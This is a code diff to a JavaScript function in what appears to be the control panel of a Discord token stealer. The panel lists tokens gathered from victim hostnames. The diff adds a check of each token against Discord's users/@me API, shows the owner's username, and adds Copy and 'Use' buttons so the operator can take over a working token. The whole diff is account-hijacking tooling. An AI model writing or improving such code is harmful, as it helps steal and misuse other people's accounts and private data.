@@ -961,21 +961,45 @@ async function fetchDiscordTokens() {
       document.getElementById('discordStatus').textContent = 'No token available';
       return;
     }
-    const latest = data[0];
-    g_discordToken = latest.token || '';
-    tbody.innerHTML = data.map(row => {
+    g_discordToken = '';
+    let validTokenFound = false;
+    const rows = [];
+    for (let r = 0; r < data.length; r++) {
+      const row = data[r];
+      const token = row.token || '';
       const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
       const host = row.hostname || '-';
-      const token = row.token || '';
+      let valid = false;
+      let userInfo = '';
+      if (token) {
+        try {
+          const testRes = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': token } });
+          valid = testRes.ok;
+          if (valid) {
+            const user = await testRes.json();
+            userInfo = (user.global_name || user.username || '') + '#' + (user.discriminator !== '0' ? user.discriminator : '');
+          }
+        } catch (_) {}
+      }
+      const statusBadge = valid ? '<span class="text-xs px-1.5 py-0.5 rounded bg-emerald-800/40 text-emerald-300 border border-emerald-700/40 ml-1">' + escapeHtml(userInfo) + '</span>' : '<span class="text-xs px-1.5 py-0.5 rounded bg-rose-800/40 text-rose-300 border border-rose-700/40 ml-1">Invalid</span>';
       const masked = token.length > 20 ? token.substring(0, 10) + '&#8226;'.repeat(20) + token.substring(token.length - 5) : '&#8226;'.repeat(20);
-      return '<tr class="hover:bg-slate-800/30 transition-colors">'
-        + '<td class="py-3 px-4 text-slate-400 whitespace-nowrap text-xs">' + ts + '</td>'
-        + '<td class="py-3 px-4 text-emerald-400 font-medium text-xs">' + escapeHtml(displayHost(host)) + '</td>'
-        + '<td class="py-3 px-4 text-xs mono-log break-all"><span class="token-mask cursor-pointer text-slate-400 hover:text-slate-200" onclick="this.textContent = this.dataset.token" data-token="' + escapeHtml(token) + '" title="Click to reveal">' + masked + '</span></td>'
-        + '<td class="py-3 px-4 text-xs"><button class="px-2 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 transition" onclick="navigator.clipboard.writeText(\'' + token.replace(/'/g, "\\'") + '\').then(()=>{this.textContent=\'Copied!\';setTimeout(()=>{this.textContent=\'Copy\'},1500)})">Copy</button></td>'
-        + '</tr>';
-    }).join('');
-    document.getElementById('discordStatus').textContent = 'Token loaded from ' + (latest.hostname || 'unknown');
+      rows.push({ ts, host, token, masked, statusBadge, valid });
+      if (valid && !validTokenFound) {
+        g_discordToken = token;
+        validTokenFound = true;
+      }
+    }
+    tbody.innerHTML = rows.map(r => '<tr class="hover:bg-slate-800/30 transition-colors">'
+      + '<td class="py-3 px-4 text-slate-400 whitespace-nowrap text-xs">' + r.ts + '</td>'
+      + '<td class="py-3 px-4 text-emerald-400 font-medium text-xs">' + escapeHtml(displayHost(r.host)) + '</td>'
+      + '<td class="py-3 px-4 text-xs mono-log break-all">'
+      + (r.valid
+          ? '<span class="token-mask cursor-pointer text-slate-400 hover:text-slate-200" onclick="this.textContent = this.dataset.token" data-token="' + escapeHtml(r.token) + '" title="Click to reveal">' + r.masked + '</span>' + r.statusBadge
+          : '<span class="text-slate-600">' + r.masked + '</span>' + r.statusBadge)
+      + '</td>'
+      + '<td class="py-3 px-4 text-xs">' + (r.valid ? '<button class="px-2 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 transition" onclick="navigator.clipboard.writeText(\'' + r.token.replace(/'/g, "\\'") + '\').then(()=>{this.textContent=\'Copied!\';setTimeout(()=>{this.textContent=\'Copy\'},1500)})">Copy</button><button class="px-2 py-1 text-xs rounded bg-violet-800 hover:bg-violet-700 text-violet-300 border border-violet-700/40 transition ml-1" onclick="g_discordToken=\'' + r.token.replace(/'/g, "\\'") + '\';document.getElementById(\'discordStatus\').textContent=\'Using: ' + r.token.substring(0,10) + '...\';showToast(\'Selected this token\',\'success\')">Use</button>' : '') + '</td>'
+      + '</tr>').join('');
+    document.getElementById('discordStatus').textContent = validTokenFound ? 'Token loaded (' + g_discordToken.substring(0, 10) + '...)' : 'No valid tokens found';
   } catch (e) {}
 }
 
